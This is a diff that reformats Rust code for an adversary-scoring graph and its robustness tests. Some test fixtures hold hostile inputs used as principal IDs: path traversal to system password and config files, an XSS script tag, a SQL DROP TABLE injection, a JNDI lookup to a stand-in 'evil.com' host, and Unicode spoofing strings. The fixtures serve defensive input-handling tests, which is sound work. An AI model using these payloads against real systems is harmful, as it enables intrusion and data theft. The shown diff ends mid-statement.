@@ -193,12 +193,16 @@ impl AdversaryGraph {
         hasher.update(b"adversary_graph_state_v1:"); // domain separator
 
         for posterior in &posteriors {
-            hasher.update((u64::try_from(posterior.principal_id.len()).unwrap_or(u64::MAX)).to_le_bytes());
+            hasher.update(
+                (u64::try_from(posterior.principal_id.len()).unwrap_or(u64::MAX)).to_le_bytes(),
+            );
             hasher.update(posterior.principal_id.as_bytes());
             hasher.update(posterior.alpha.to_le_bytes());
             hasher.update(posterior.beta.to_le_bytes());
             hasher.update(posterior.evidence_count.to_le_bytes());
-            hasher.update((u64::try_from(posterior.evidence_hash.len()).unwrap_or(u64::MAX)).to_le_bytes());
+            hasher.update(
+                (u64::try_from(posterior.evidence_hash.len()).unwrap_or(u64::MAX)).to_le_bytes(),
+            );
             hasher.update(posterior.evidence_hash.as_bytes());
         }
 
@@ -357,9 +361,7 @@ mod tests {
         for edge in edges {
             let weight = clamp_edge_weight(edge.weight);
             if weight > 0.0 {
-                let adjacency_list = adjacency
-                    .entry(edge.from)
-                    .or_default();
+                let adjacency_list = adjacency.entry(edge.from).or_default();
                 push_bounded(adjacency_list, (edge.to, weight), 1000);
             }
         }
@@ -746,7 +748,10 @@ mod tests {
 
             assert!(left.starts_with("sha256:"));
             assert!(right.starts_with("sha256:"));
-            assert!(!constant_time::ct_eq_bytes(left.as_bytes(), right.as_bytes()));
+            assert!(!constant_time::ct_eq_bytes(
+                left.as_bytes(),
+                right.as_bytes()
+            ));
         }
 
         #[test]
@@ -754,7 +759,10 @@ mod tests {
             let left = chain_evidence_hash("", "ev", "trace-a", 0.75, 8);
             let right = chain_evidence_hash("", "evtrace-", "a", 0.75, 8);
 
-            assert!(!constant_time::ct_eq_bytes(left.as_bytes(), right.as_bytes()));
+            assert!(!constant_time::ct_eq_bytes(
+                left.as_bytes(),
+                right.as_bytes()
+            ));
         }
 
         #[test]
@@ -888,30 +896,31 @@ mod tests {
         let large_evidence = "b".repeat(100000);
         let large_trace = "c".repeat(100000);
 
-        let hash = chain_evidence_hash(
-            &large_previous,
-            &large_evidence,
-            &large_trace,
-            0.5,
-            42
-        );
+        let hash = chain_evidence_hash(&large_previous, &large_evidence, &large_trace, 0.5, 42);
 
         assert!(hash.starts_with("sha256:"));
         assert_eq!(hash.len(), 71); // "sha256:" + 64 hex chars
-        assert!(hash.chars().skip(7).all(|c| c.is_ascii_hexdigit() || c.is_ascii_lowercase()));
+        assert!(
+            hash.chars()
+                .skip(7)
+                .all(|c| c.is_ascii_hexdigit() || c.is_ascii_lowercase())
+        );
     }
 
     #[test]
     fn negative_chain_evidence_hash_unicode_collision_resistance() {
         // Test that Unicode normalization doesn't create hash collisions
-        let nfc_evidence = "café";  // NFC normalized
-        let nfd_evidence = "cafe\u{0301}";  // NFD normalized (e + combining acute)
+        let nfc_evidence = "café"; // NFC normalized
+        let nfd_evidence = "cafe\u{0301}"; // NFD normalized (e + combining acute)
 
         let hash_nfc = chain_evidence_hash("", nfc_evidence, "trace", 0.5, 1);
         let hash_nfd = chain_evidence_hash("", nfd_evidence, "trace", 0.5, 1);
 
         assert_ne!(hash_nfc, hash_nfd);
-        assert!(!constant_time::ct_eq_bytes(hash_nfc.as_bytes(), hash_nfd.as_bytes()));
+        assert!(!constant_time::ct_eq_bytes(
+            hash_nfc.as_bytes(),
+            hash_nfd.as_bytes()
+        ));
     }
 
     #[test]
@@ -938,7 +947,9 @@ mod tests {
         // Add many principals to test memory behavior
         for i in 0..10000 {
             let principal = format!("ext:principal_{:06}", i);
-            graph.ingest(&obs(&principal, 0.1, 1, "ev-mass", "trace-mass")).unwrap();
+            graph
+                .ingest(&obs(&principal, 0.1, 1, "ev-mass", "trace-mass"))
+                .unwrap();
         }
 
         let posteriors = graph.posteriors();
@@ -997,8 +1008,9 @@ mod tests {
             0.5,
             1,
             "ev\tcontrol\x00ref",
-            "trace\nwith\rcontrol\x1f"
-        ).unwrap();
+            "trace\nwith\rcontrol\x1f",
+        )
+        .unwrap();
 
         let mut graph = AdversaryGraph::new();
         let posterior = graph.ingest(&obs_with_controls).unwrap();
@@ -1024,7 +1036,11 @@ mod tests {
             if likelihood >= 0.0 && likelihood <= 1.0 && likelihood.is_finite() {
                 assert!(result.is_ok(), "Subnormal {} should be valid", likelihood);
             } else {
-                assert!(result.is_err(), "Invalid subnormal {} should be rejected", likelihood);
+                assert!(
+                    result.is_err(),
+                    "Invalid subnormal {} should be rejected",
+                    likelihood
+                );
             }
         }
     }
@@ -1036,7 +1052,7 @@ mod tests {
             likelihood_compromise: f64::MIN_POSITIVE,
             evidence_weight: u64::MAX,
             evidence_ref: "\0".repeat(1000), // Null bytes
-            trace_id: "🚀".repeat(1000), // Emoji
+            trace_id: "🚀".repeat(1000),     // Emoji
         };
 
         // Test serialization doesn't panic
@@ -1072,9 +1088,9 @@ mod tests {
         // Test edge weight clamping with denormal values
         let edge_cases = [
             (0.0, 0.0),
-            (-0.0, 0.0), // Negative zero
+            (-0.0, 0.0),                                        // Negative zero
             (f64::MIN_POSITIVE / 2.0, f64::MIN_POSITIVE / 2.0), // Subnormal
-            (f64::from_bits(1), f64::from_bits(1)), // Smallest positive denormal
+            (f64::from_bits(1), f64::from_bits(1)),             // Smallest positive denormal
         ];
 
         for (input, expected) in edge_cases {
@@ -1091,7 +1107,7 @@ mod tests {
         // Test rank convergence when all edges have zero weight
         let topology = [
             edge("ext:a", "ext:b", 0.0),
-            edge("ext:b", "ext:c", -1.0), // Will be clamped to 0.0
+            edge("ext:b", "ext:c", -1.0),     // Will be clamped to 0.0
             edge("ext:c", "ext:a", f64::NAN), // Will be clamped to 0.0
         ];
 
@@ -1100,7 +1116,7 @@ mod tests {
 
         // Should maintain uniform distribution when no edges have weight
         assert!((total - 1.0).abs() < 1e-9);
-        assert!(ranks.values().all(|r| (r - 1.0/3.0).abs() < 1e-6));
+        assert!(ranks.values().all(|r| (r - 1.0 / 3.0).abs() < 1e-6));
     }
 
     #[test]
@@ -1140,38 +1156,33 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             f64::NAN,
             f64::INFINITY,
             f64::NEG_INFINITY,
-
             // Constructed NaN patterns (different bit representations)
             f64::from_bits(0x7ff8000000000001), // SNaN
             f64::from_bits(0x7ffc000000000000), // QNaN
             f64::from_bits(0xfff8000000000001), // Negative SNaN
             f64::from_bits(0xfffc000000000000), // Negative QNaN
-
             // Extreme finite values
             f64::MAX,
             f64::MIN,
             f64::MIN_POSITIVE,
             -f64::MAX,
-            1e308,   // Near overflow
-            1e-308,  // Near underflow
-            -1e308,  // Negative near overflow
-
+            1e308,  // Near overflow
+            1e-308, // Near underflow
+            -1e308, // Negative near overflow
             // Boundary violations
-            1.0000000000000001, // Just above 1.0
+            1.0000000000000001,  // Just above 1.0
             -0.0000000000000001, // Just below 0.0
-            2.0,     // Well above range
-            -1.0,    // Well below range
-            100.0,   // Far outside range
-            -100.0,  // Far outside negative range
-
+            2.0,                 // Well above range
+            -1.0,                // Well below range
+            100.0,               // Far outside range
+            -100.0,              // Far outside negative range
             // Precision edge cases
             0.9999999999999999, // Near 1.0
             0.0000000000000001, // Near 0.0
             0.5 + f64::EPSILON, // Just above 0.5
             0.5 - f64::EPSILON, // Just below 0.5
-
             // Values that could cause arithmetic issues
-            1.0 / 3.0, // Repeating decimal
+            1.0 / 3.0,                  // Repeating decimal
             std::f64::consts::PI - 3.0, // Irrational remainder
         ];
 
@@ -1192,15 +1203,27 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     match ingest_result {
                         Ok(posterior) => {
                             // Should produce valid posterior despite malicious likelihood
-                            assert!(posterior.posterior.is_finite(),
-                                "Posterior should be finite for attack {}: {}", idx, malicious_likelihood);
-                            assert!((0.0..=1.0).contains(&posterior.posterior),
-                                "Posterior should be in valid range for attack {}: {}", idx, posterior.posterior);
+                            assert!(
+                                posterior.posterior.is_finite(),
+                                "Posterior should be finite for attack {}: {}",
+                                idx,
+                                malicious_likelihood
+                            );
+                            assert!(
+                                (0.0..=1.0).contains(&posterior.posterior),
+                                "Posterior should be in valid range for attack {}: {}",
+                                idx,
+                                posterior.posterior
+                            );
                         }
                         Err(AdversaryGraphError::InvalidLikelihood { value }) => {
                             // Expected rejection of invalid likelihood
-                            assert!(!value.is_finite() || !((0.0..=1.0).contains(&value)),
-                                "Should reject invalid likelihood for attack {}: {}", idx, value);
+                            assert!(
+                                !value.is_finite() || !((0.0..=1.0).contains(&value)),
+                                "Should reject invalid likelihood for attack {}: {}",
+                                idx,
+                                value
+                            );
                         }
                         Err(other) => {
                             panic!("Unexpected error for float attack {}: {:?}", idx, other);
@@ -1211,16 +1234,19 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     // Expected validation failure for invalid likelihoods
                 }
                 Err(other) => {
-                    panic!("Unexpected observation error for float attack {}: {:?}", idx, other);
+                    panic!(
+                        "Unexpected observation error for float attack {}: {:?}",
+                        idx, other
+                    );
                 }
             }
         }
 
         // Test 2: Arithmetic operation result validation
         let arithmetic_test_cases = vec![
-            (1.0, u64::MAX),    // Maximum weight multiplication
-            (0.0, u64::MAX),    // Zero likelihood with max weight
-            (0.5, 1),           // Minimal non-zero computation
+            (1.0, u64::MAX),            // Maximum weight multiplication
+            (0.0, u64::MAX),            // Zero likelihood with max weight
+            (0.5, 1),                   // Minimal non-zero computation
             (0.999999999999, u64::MAX), // Near-one with large weight
             (f64::MIN_POSITIVE, 1),     // Tiny likelihood
         ];
@@ -1232,14 +1258,22 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 weight,
                 "arithmetic_evidence",
                 "arithmetic_trace",
-            ).unwrap();
+            )
+            .unwrap();
 
             let result = graph.ingest(&observation);
             if let Ok(posterior) = result {
-                assert!(posterior.posterior.is_finite(),
-                    "Arithmetic result should be finite: likelihood={}, weight={}", likelihood, weight);
-                assert!((0.0..=1.0).contains(&posterior.posterior),
-                    "Arithmetic result should be in valid range: {}", posterior.posterior);
+                assert!(
+                    posterior.posterior.is_finite(),
+                    "Arithmetic result should be finite: likelihood={}, weight={}",
+                    likelihood,
+                    weight
+                );
+                assert!(
+                    (0.0..=1.0).contains(&posterior.posterior),
+                    "Arithmetic result should be in valid range: {}",
+                    posterior.posterior
+                );
             }
         }
 
@@ -1252,13 +1286,20 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 1,
                 format!("evidence_{}", i),
                 format!("trace_{}", i),
-            ).unwrap();
+            )
+            .unwrap();
 
             if let Ok(posterior) = graph.ingest(&observation) {
-                assert!(posterior.posterior.is_finite(),
-                    "Precision should not degrade to non-finite at iteration {}", i);
-                assert!(posterior.posterior >= 0.0 && posterior.posterior <= 1.0,
-                    "Precision degradation should not escape valid range at iteration {}", i);
+                assert!(
+                    posterior.posterior.is_finite(),
+                    "Precision should not degrade to non-finite at iteration {}",
+                    i
+                );
+                assert!(
+                    posterior.posterior >= 0.0 && posterior.posterior <= 1.0,
+                    "Precision degradation should not escape valid range at iteration {}",
+                    i
+                );
             }
         }
     }
@@ -1269,10 +1310,10 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         // Test 1: Evidence weight boundary conditions and overflow attacks
         let weight_attack_vectors = vec![
-            0,           // Invalid: zero weight
-            1,           // Minimal valid
-            u64::MAX,    // Maximum possible
-            u64::MAX - 1, // Near maximum
+            0,                   // Invalid: zero weight
+            1,                   // Minimal valid
+            u64::MAX,            // Maximum possible
+            u64::MAX - 1,        // Near maximum
             1000000000000000000, // Large but not maximum
         ];
 
@@ -1292,12 +1333,21 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     match ingest_result {
                         Ok(posterior) => {
                             // Should handle large weights without overflow
-                            assert!(posterior.evidence_count >= 1,
-                                "Evidence count should increase for weight {}", weight);
-                            assert!(posterior.alpha + posterior.beta > 0,
-                                "Alpha + beta should be positive for weight {}", weight);
-                            assert!(posterior.posterior.is_finite(),
-                                "Posterior should remain finite for weight {}", weight);
+                            assert!(
+                                posterior.evidence_count >= 1,
+                                "Evidence count should increase for weight {}",
+                                weight
+                            );
+                            assert!(
+                                posterior.alpha + posterior.beta > 0,
+                                "Alpha + beta should be positive for weight {}",
+                                weight
+                            );
+                            assert!(
+                                posterior.posterior.is_finite(),
+                                "Posterior should remain finite for weight {}",
+                                weight
+                            );
                         }
                         Err(error) => {
                             panic!("Unexpected ingest error for weight {}: {:?}", weight, error);
@@ -1309,31 +1359,42 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     assert_eq!(value, 0, "Should reject zero weight");
                 }
                 Err(other) => {
-                    panic!("Unexpected observation error for weight {}: {:?}", weight, other);
+                    panic!(
+                        "Unexpected observation error for weight {}: {:?}",
+                        weight, other
+                    );
                 }
             }
         }
 
         // Test 2: Cumulative weight overflow protection
-        let principals = (0..100).map(|i| format!("overflow_principal_{}", i)).collect::<Vec<_>>();
+        let principals = (0..100)
+            .map(|i| format!("overflow_principal_{}", i))
+            .collect::<Vec<_>>();
 
         for principal in &principals {
             for iteration in 0..1000 {
                 let observation = AdversaryObservation::new(
                     principal.clone(),
-                    0.1, // Low likelihood to test beta accumulation
+                    0.1,             // Low likelihood to test beta accumulation
                     u64::MAX / 1000, // Large weight that could cause overflow
                     format!("overflow_evidence_{}_{}", principal, iteration),
                     format!("overflow_trace_{}_{}", principal, iteration),
-                ).unwrap();
+                )
+                .unwrap();
 
                 let result = graph.ingest(&observation);
                 if let Ok(posterior) = result {
                     // Verify no overflow occurred
-                    assert!(posterior.alpha != u64::MAX || posterior.beta != u64::MAX,
-                        "Should use saturating arithmetic to prevent overflow");
-                    assert!(posterior.evidence_count <= 1000,
-                        "Evidence count should match iterations: {}", posterior.evidence_count);
+                    assert!(
+                        posterior.alpha != u64::MAX || posterior.beta != u64::MAX,
+                        "Should use saturating arithmetic to prevent overflow"
+                    );
+                    assert!(
+                        posterior.evidence_count <= 1000,
+                        "Evidence count should match iterations: {}",
+                        posterior.evidence_count
+                    );
                 } else {
                     break; // Stop if we hit an error condition
                 }
@@ -1355,13 +1416,22 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             let (successes, failures) = split_weight(likelihood, weight);
 
             // Verify weight conservation
-            assert_eq!(successes + failures, weight,
+            assert_eq!(
+                successes + failures,
+                weight,
                 "Weight should be conserved: {}+{}={} (expected {})",
-                successes, failures, successes + failures, weight);
+                successes,
+                failures,
+                successes + failures,
+                weight
+            );
 
             // Verify reasonable distribution
             if likelihood == 0.0 {
-                assert_eq!(successes, 0, "Zero likelihood should produce zero successes");
+                assert_eq!(
+                    successes, 0,
+                    "Zero likelihood should produce zero successes"
+                );
             } else if likelihood == 1.0 {
                 assert_eq!(failures, 0, "Full likelihood should produce zero failures");
             }
@@ -1378,39 +1448,32 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             "principal\r\n\t\x08attack",
             "principal\x00null\x01injection",
             "principal\x1b[31mANSI\x1b[0mattack",
-
             // Unicode attacks
             "principal\u{202E}ecneics\u{202D}normal", // BiDi override
             "principal\u{FEFF}\u{200B}\u{200C}invisible", // Invisible characters
             "principal\u{10FFFF}\u{E000}\u{FDD0}private", // Private use/noncharacters
-
             // Path traversal attempts
             "../../../etc/passwd",
             "..\\windows\\system32\\config",
             "principal/../../inject",
-
             // XSS and injection patterns
             "<script>alert('principal')</script>",
             "'; DROP TABLE principals; --",
             "${jndi:ldap://evil.com/principal}",
-
             // Very long IDs
-            "x".repeat(1000000), // 1MB principal ID
+            "x".repeat(1000000),       // 1MB principal ID
             "\u{1F4A9}".repeat(10000), // Emoji flood
-
             // Empty and whitespace
             "",
             " ",
             "\t\r\n\0",
             "\u{3000}", // Ideographic space
-
             // JSON/XML injection
             "{\"malicious\": \"json\"}",
             "<xml>attack</xml>",
             "normal\"injection",
-
             // Homograph attacks
-            "аdmin", // Cyrillic 'а' instead of Latin 'a'
+            "аdmin",     // Cyrillic 'а' instead of Latin 'a'
             "prіncipal", // Cyrillic 'і' instead of Latin 'i'
             "prinсipal", // Cyrillic 'с' instead of Latin 'c'
         ];
@@ -1422,29 +1485,44 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 100, // Valid weight
                 format!("evidence_{}", idx),
                 format!("trace_{}", idx),
-            ).unwrap();
+            )
+            .unwrap();
 
             let result = graph.ingest(&observation);
 
             match result {
                 Ok(posterior) => {
                     // If ingestion succeeds, verify data integrity
-                    assert_eq!(posterior.principal_id, *malicious_id,
-                        "Principal ID should be preserved exactly: '{}'", malicious_id.escape_debug());
-                    assert!(posterior.posterior.is_finite(),
-                        "Posterior should be valid for principal: '{}'", malicious_id.escape_debug());
+                    assert_eq!(
+                        posterior.principal_id,
+                        *malicious_id,
+                        "Principal ID should be preserved exactly: '{}'",
+                        malicious_id.escape_debug()
+                    );
+                    assert!(
+                        posterior.posterior.is_finite(),
+                        "Posterior should be valid for principal: '{}'",
+                        malicious_id.escape_debug()
+                    );
                 }
                 Err(error) => {
                     // Some extreme cases may be rejected - ensure error is meaningful
-                    assert!(!error.to_string().is_empty(),
-                        "Error should be meaningful for principal '{}': {:?}", malicious_id.escape_debug(), error);
+                    assert!(
+                        !error.to_string().is_empty(),
+                        "Error should be meaningful for principal '{}': {:?}",
+                        malicious_id.escape_debug(),
+                        error
+                    );
                 }
             }
         }
 
         // Test 2: Evidence reference and trace ID injection
         let ref_trace_attacks = vec![
-            ("evidence\x00null".to_string(), "trace\r\ninjection".to_string()),
+            (
+                "evidence\x00null".to_string(),
+                "trace\r\ninjection".to_string(),
+            ),
             (
                 "evidence\u{202E}spoofed".to_string(),
                 "trace\u{FEFF}invisible".to_string(),
@@ -1455,14 +1533,8 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             ),
             ("evidence".repeat(100000), "trace".repeat(100000)),
             (
-                format!(
-                    "evi{}dence",
-                    String::from_utf8_lossy(&[0xED, 0xA0, 0x80])
-                ),
-                format!(
-                    "tra{}ce",
-                    String::from_utf8_lossy(&[0xED, 0xBF, 0xBF])
-                ),
+                format!("evi{}dence", String::from_utf8_lossy(&[0xED, 0xA0, 0x80])),
+                format!("tra{}ce", String::from_utf8_lossy(&[0xED, 0xBF, 0xBF])),
             ),
         ];
 
@@ -1473,53 +1545,73 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 50,
                 evidence_ref.as_str(),
                 trace_id.as_str(),
-            ).unwrap();
+            )
+            .unwrap();
 
             let result = graph.ingest(&observation);
             if let Ok(posterior) = result {
-                assert_eq!(posterior.last_trace_id, *trace_id,
-                    "Trace ID should be preserved: '{}'", trace_id.escape_debug());
-                assert!(!posterior.evidence_hash.is_empty(),
-                    "Evidence hash should be generated despite malicious input");
+                assert_eq!(
+                    posterior.last_trace_id,
+                    *trace_id,
+                    "Trace ID should be preserved: '{}'",
+                    trace_id.escape_debug()
+                );
+                assert!(
+                    !posterior.evidence_hash.is_empty(),
+                    "Evidence hash should be generated despite malicious input"
+                );
             }
         }
 
         // Test 3: Concurrent principal creation with similar/confusing names
         let confusing_principals = vec![
-            "user_1", "user_2", "user_3", // Similar names
-            "user", "user_", "user__", // Subtle variations
-            "admin", "аdmin", "admin_", // Homograph variations
-            "test\u{200B}", "test", "test\u{FEFF}", // Invisible character variations
+            "user_1",
+            "user_2",
+            "user_3", // Similar names
+            "user",
+            "user_",
+            "user__", // Subtle variations
+            "admin",
+            "аdmin",
+            "admin_", // Homograph variations
+            "test\u{200B}",
+            "test",
+            "test\u{FEFF}", // Invisible character variations
         ];
 
         let graph_arc = Arc::new(Mutex::new(AdversaryGraph::new()));
         let results = Arc::new(Mutex::new(Vec::new()));
 
         // Create observations for confusing principals concurrently
-        let handles: Vec<_> = confusing_principals.into_iter().enumerate().map(|(idx, principal)| {
-            let graph_clone = graph_arc.clone();
-            let results_clone = results.clone();
+        let handles: Vec<_> = confusing_principals
+            .into_iter()
+            .enumerate()
+            .map(|(idx, principal)| {
+                let graph_clone = graph_arc.clone();
+                let results_clone = results.clone();
 
-            thread::spawn(move || {
-                let observation = AdversaryObservation::new(
-                    principal.clone(),
-                    0.4,
-                    10,
-                    format!("concurrent_evidence_{}", idx),
-                    format!("concurrent_trace_{}", idx),
-                ).unwrap();
+                thread::spawn(move || {
+                    let observation = AdversaryObservation::new(
+                        principal.clone(),
+                        0.4,
+                        10,
+                        format!("concurrent_evidence_{}", idx),
+                        format!("concurrent_trace_{}", idx),
+                    )
+                    .unwrap();
 
-                let result = {
-                    let mut graph_guard = graph_clone.lock().unwrap();
-                    graph_guard.ingest(&observation)
-                };
+                    let result = {
+                        let mut graph_guard = graph_clone.lock().unwrap();
+                        graph_guard.ingest(&observation)
+                    };
 
-                {
-                    let mut results = results_clone.lock().unwrap();
-                    push_bounded(&mut *results, (principal, result), 100);
-                }
+                    {
+                        let mut results = results_clone.lock().unwrap();
+                        push_bounded(&mut *results, (principal, result), 100);
+                    }
+                })
             })
-        }).collect();
+            .collect();
 
         // Wait for all threads
         for handle in handles {
@@ -1534,13 +1626,19 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let mut seen_principals = HashSet::new();
 
         for posterior in &posteriors {
-            assert!(seen_principals.insert(posterior.principal_id.clone()),
-                "Principal ID should be unique: '{}'", posterior.principal_id.escape_debug());
+            assert!(
+                seen_principals.insert(posterior.principal_id.clone()),
+                "Principal ID should be unique: '{}'",
+                posterior.principal_id.escape_debug()
+            );
         }
 
         // Verify reasonable number of distinct principals created
-        assert!(seen_principals.len() >= 8,
-            "Should have created multiple distinct principals: {}", seen_principals.len());
+        assert!(
+            seen_principals.len() >= 8,
+            "Should have created multiple distinct principals: {}",
+            seen_principals.len()
+        );
     }
 
     #[test]
@@ -1562,37 +1660,34 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         ];
 
         for (evidence_1, trace_1, evidence_2, trace_2) in hash_collision_attempts {
-            let obs_1 = AdversaryObservation::new(
-                "collision_test",
-                0.3,
-                100,
-                evidence_1,
-                trace_1,
-            ).unwrap();
+            let obs_1 =
+                AdversaryObservation::new("collision_test", 0.3, 100, evidence_1, trace_1).unwrap();
 
-            let obs_2 = AdversaryObservation::new(
-                "collision_test",
-                0.7,
-                100,
-                evidence_2,
-                trace_2,
-            ).unwrap();
+            let obs_2 =
+                AdversaryObservation::new("collision_test", 0.7, 100, evidence_2, trace_2).unwrap();
 
             let result_1 = graph.ingest(&obs_1).unwrap();
             let result_2 = graph.ingest(&obs_2).unwrap();
 
             // Hash chains should be different for different evidence
             if evidence_1 != evidence_2 || trace_1 != trace_2 {
-                assert_ne!(result_1.evidence_hash, result_2.evidence_hash,
+                assert_ne!(
+                    result_1.evidence_hash, result_2.evidence_hash,
                     "Different evidence should produce different hashes: '{}+{}' vs '{}+{}'",
-                    evidence_1, trace_1, evidence_2, trace_2);
+                    evidence_1, trace_1, evidence_2, trace_2
+                );
             }
 
             // Hash should be deterministic and non-empty
-            assert!(!result_2.evidence_hash.is_empty(),
-                "Evidence hash should not be empty");
-            assert!(result_2.evidence_hash.len() >= 32,
-                "Evidence hash should be reasonable length: {}", result_2.evidence_hash.len());
+            assert!(
+                !result_2.evidence_hash.is_empty(),
+                "Evidence hash should not be empty"
+            );
+            assert!(
+                result_2.evidence_hash.len() >= 32,
+                "Evidence hash should be reasonable length: {}",
+                result_2.evidence_hash.len()
+            );
         }
 
         // Test 2: Hash chain order dependence
@@ -1607,25 +1702,13 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         // Add in forward order
         for (evidence, trace) in &evidence_sequence {
-            let obs = AdversaryObservation::new(
-                "order_test",
-                0.5,
-                50,
-                evidence,
-                trace,
-            ).unwrap();
+            let obs = AdversaryObservation::new("order_test", 0.5, 50, evidence, trace).unwrap();
             let _ = graph_a.ingest(&obs);
         }
 
         // Add in reverse order
         for (evidence, trace) in evidence_sequence.iter().rev() {
-            let obs = AdversaryObservation::new(
-                "order_test",
-                0.5,
-                50,
-                evidence,
-                trace,
-            ).unwrap();
+            let obs = AdversaryObservation::new("order_test", 0.5, 50, evidence, trace).unwrap();
             let _ = graph_b.ingest(&obs);
         }
 
@@ -1634,10 +1717,14 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         // Different ingestion orders should produce different evidence hashes
         // but same posterior values (since we use same likelihood/weight)
-        assert_ne!(posterior_a.evidence_hash, posterior_b.evidence_hash,
-            "Different ingestion orders should produce different evidence hashes");
-        assert_eq!(posterior_a.posterior, posterior_b.posterior,
-            "Same evidence should produce same posterior regardless of order");
+        assert_ne!(
+            posterior_a.evidence_hash, posterior_b.evidence_hash,
+            "Different ingestion orders should produce different evidence hashes"
+        );
+        assert_eq!(
+            posterior_a.posterior, posterior_b.posterior,
+            "Same evidence should produce same posterior regardless of order"
+        );
 
         // Test 3: Large-scale hash collision resistance
         let mut seen_hashes = HashSet::new();
@@ -1647,19 +1734,28 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             let obs = AdversaryObservation::new(
                 format!("hash_test_{}", i),
                 (i as f64) / (collision_test_count as f64), // Varying likelihood
-                (i % 1000) + 1, // Varying weight
+                (i % 1000) + 1,                             // Varying weight
                 format!("evidence_{}", i),
                 format!("trace_{}", i),
-            ).unwrap();
+            )
+            .unwrap();
 
             if let Ok(posterior) = graph.ingest(&obs) {
-                assert!(seen_hashes.insert(posterior.evidence_hash.clone()),
-                    "Hash collision detected at iteration {}: {}", i, posterior.evidence_hash);
+                assert!(
+                    seen_hashes.insert(posterior.evidence_hash.clone()),
+                    "Hash collision detected at iteration {}: {}",
+                    i,
+                    posterior.evidence_hash
+                );
             }
         }
 
-        assert!(seen_hashes.len() > collision_test_count / 2,
-            "Should generate diverse hashes: {} unique out of {}", seen_hashes.len(), collision_test_count);
+        assert!(
+            seen_hashes.len() > collision_test_count / 2,
+            "Should generate diverse hashes: {} unique out of {}",
+            seen_hashes.len(),
+            collision_test_count
+        );
     }
 
     #[test]
@@ -1694,7 +1790,11 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         for (perm_idx, observations) in permutations.iter().enumerate() {
             let graph_result = AdversaryGraph::replay_from(observations);
-            assert!(graph_result.is_ok(), "Replay should succeed for permutation {}", perm_idx);
+            assert!(
+                graph_result.is_ok(),
+                "Replay should succeed for permutation {}",
+                perm_idx
+            );
 
             let graph = graph_result.unwrap();
             let posteriors = graph.posteriors();
@@ -1704,19 +1804,33 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         // All permutations should produce identical results
         for i in 1..replay_results.len() {
-            assert_eq!(replay_results[0].len(), replay_results[i].len(),
-                "Permutation {} should have same number of posteriors", i);
+            assert_eq!(
+                replay_results[0].len(),
+                replay_results[i].len(),
+                "Permutation {} should have same number of posteriors",
+                i
+            );
 
             for j in 0..replay_results[0].len() {
                 let ref_posterior = &replay_results[0][j];
                 let test_posterior = &replay_results[i][j];
 
-                assert_eq!(ref_posterior.principal_id, test_posterior.principal_id,
-                    "Principal ID should match across permutations: {} vs {}", ref_posterior.principal_id, test_posterior.principal_id);
-                assert!((ref_posterior.posterior - test_posterior.posterior).abs() < 1e-15,
-                    "Posterior should be deterministic: {} vs {}", ref_posterior.posterior, test_posterior.posterior);
-                assert_eq!(ref_posterior.evidence_count, test_posterior.evidence_count,
-                    "Evidence count should match: {} vs {}", ref_posterior.evidence_count, test_posterior.evidence_count);
+                assert_eq!(
+                    ref_posterior.principal_id, test_posterior.principal_id,
+                    "Principal ID should match across permutations: {} vs {}",
+                    ref_posterior.principal_id, test_posterior.principal_id
+                );
+                assert!(
+                    (ref_posterior.posterior - test_posterior.posterior).abs() < 1e-15,
+                    "Posterior should be deterministic: {} vs {}",
+                    ref_posterior.posterior,
+                    test_posterior.posterior
+                );
+                assert_eq!(
+                    ref_posterior.evidence_count, test_posterior.evidence_count,
+                    "Evidence count should match: {} vs {}",
+                    ref_posterior.evidence_count, test_posterior.evidence_count
+                );
             }
         }
 
@@ -1725,11 +1839,9 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             // Exact duplicates
             AdversaryObservation::new("dup_test", 0.5, 100, "evidence", "trace").unwrap(),
             AdversaryObservation::new("dup_test", 0.5, 100, "evidence", "trace").unwrap(),
-
             // Near duplicates (different trace IDs)
             AdversaryObservation::new("near_dup", 0.5, 100, "evidence", "trace_a").unwrap(),
             AdversaryObservation::new("near_dup", 0.5, 100, "evidence", "trace_b").unwrap(),
-
             // Same principal, different everything else
             AdversaryObservation::new("same_principal", 0.2, 50, "evidence_1", "trace_1").unwrap(),
             AdversaryObservation::new("same_principal", 0.8, 200, "evidence_2", "trace_2").unwrap(),
@@ -1739,12 +1851,21 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         assert!(dup_graph.is_ok(), "Should handle duplicates gracefully");
 
         let dup_posteriors = dup_graph.unwrap().posteriors();
-        assert!(dup_posteriors.len() <= 3, "Should not create excess principals from duplicates");
+        assert!(
+            dup_posteriors.len() <= 3,
+            "Should not create excess principals from duplicates"
+        );
 
         // Verify evidence count accumulation
         for posterior in &dup_posteriors {
-            assert!(posterior.evidence_count >= 1, "Evidence count should be at least 1");
-            assert!(posterior.posterior.is_finite(), "Posterior should remain finite with duplicates");
+            assert!(
+                posterior.evidence_count >= 1,
+                "Evidence count should be at least 1"
+            );
+            assert!(
+                posterior.posterior.is_finite(),
+                "Posterior should remain finite with duplicates"
+            );
         }
 
         // Test 3: Replay with extreme volume to test memory and performance
@@ -1757,10 +1878,11 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 let observation = AdversaryObservation::new(
